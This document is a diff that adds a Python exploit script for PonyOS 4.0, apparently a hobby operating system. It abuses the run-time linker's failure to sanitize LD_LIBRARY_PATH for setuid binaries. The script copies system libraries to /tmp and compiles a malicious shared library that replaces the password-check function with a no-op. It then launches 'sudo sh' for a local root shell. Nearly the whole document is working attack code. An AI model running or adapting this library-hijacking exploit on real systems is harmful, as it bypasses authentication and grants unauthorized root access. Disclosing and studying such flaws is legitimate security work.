@@ -1,0 +1,31 @@
+#!/usr/bin/python
+#PonyOS 4.0 has added several improvements over previous releases
+#including support for setuid binaries and dynamic libraries. The
+#run-time linker does not sanitize environment variables when 
+#running setuid files allowing for local root exploitation through
+#manipulated LD_LIBRARY_PATH. Requires build-essential installed
+#to compile the malicious library.
+import shutil
+import os
+
+if __name__=="__main__":
+    print("[+] fluttershy - dynamic linker exploit for ponyos 4.0")
+    shutil.copyfile("/usr/lib/libc.so","/tmp/libc.so")
+    shutil.copyfile("/usr/lib/libm.so","/tmp/libm.so")
+    shutil.copyfile("/usr/lib/libpng15.so","/tmp/libpng15.so")
+    shutil.copyfile("/usr/lib/libtoaru-graphics.so","/tmp/libtoaru-graphics.so")
+    shutil.copyfile("/usr/lib/libtoaru-kbd.so","/tmp/libtoaru-kbd.so")
+    shutil.copyfile("/usr/lib/libtoaru-rline.so","/tmp/libtoaru-rline.so")
+    shutil.copyfile("/usr/lib/libtoaru-list.so","/tmp/libtoaru-list.so")
+    shutil.copyfile("/usr/lib/libtoaru-sha2.so","/tmp/libtoaru-sha2.so")
+    shutil.copyfile("/usr/lib/libtoaru-termemu.so","/tmp/libtoaru-termemu.so")
+    shutil.copyfile("/usr/lib/libz.so", "/tmp/libz.so")
+    fd = open("/tmp/lib.c","w")
+    fd.write("#include <stdio.h>\n#include <stdlib.h>\n\n")
+    fd.write("void toaru_auth_check_pass(char* username, char* password){\n")
+    fd.write("\tprintf(\"[+] pony smash!\\n\");\n}\n")
+    fd.close()
+    os.system("gcc -fpic -c /tmp/lib.c")
+    os.system("gcc -shared -o /tmp/libtoaru-toaru_auth.so /tmp/lib.o")
+    os.environ["LD_LIBRARY_PATH"] = "/tmp"
+    os.system("sudo sh")
